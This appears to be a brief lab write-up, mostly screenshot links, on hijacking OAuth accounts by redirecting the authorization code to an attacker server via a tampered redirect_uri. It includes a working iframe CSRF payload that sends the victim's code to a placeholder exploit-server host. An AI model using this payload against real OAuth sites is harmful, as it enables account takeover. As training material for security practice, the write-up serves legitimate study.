# OAuth account hijacking via redirect_uri

Intercept OAuth initialization request

![Снимок экрана 2025-10-20 в 14.37.18.png](OAuth%20account%20hijacking%20via%20redirect_uri/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-10-20_%D0%B2_14.37.18.png)

And swap redirect_uri with our server

![Снимок экрана 2025-10-20 в 14.37.49.png](OAuth%20account%20hijacking%20via%20redirect_uri/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-10-20_%D0%B2_14.37.49.png)

Then craft CSRF payload

![Снимок экрана 2025-10-20 в 16.55.41.png](OAuth%20account%20hijacking%20via%20redirect_uri/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-10-20_%D0%B2_16.55.41.png)

Don’t forget to set up JS grabber

```jsx
<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
```

![Снимок экрана 2025-10-20 в 16.56.26.png](OAuth%20account%20hijacking%20via%20redirect_uri/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-10-20_%D0%B2_16.56.26.png)

![Снимок экрана 2025-10-20 в 17.02.52.png](OAuth%20account%20hijacking%20via%20redirect_uri/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-10-20_%D0%B2_17.02.52.png)

![Снимок экрана 2025-10-20 в 17.04.15.png](OAuth%20account%20hijacking%20via%20redirect_uri/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-10-20_%D0%B2_17.04.15.png)

![Снимок экрана 2025-10-20 в 17.04.41.png](OAuth%20account%20hijacking%20via%20redirect_uri/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-10-20_%D0%B2_17.04.41.png)

![Снимок экрана 2025-10-20 в 17.04.58.png](OAuth%20account%20hijacking%20via%20redirect_uri/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-10-20_%D0%B2_17.04.58.png)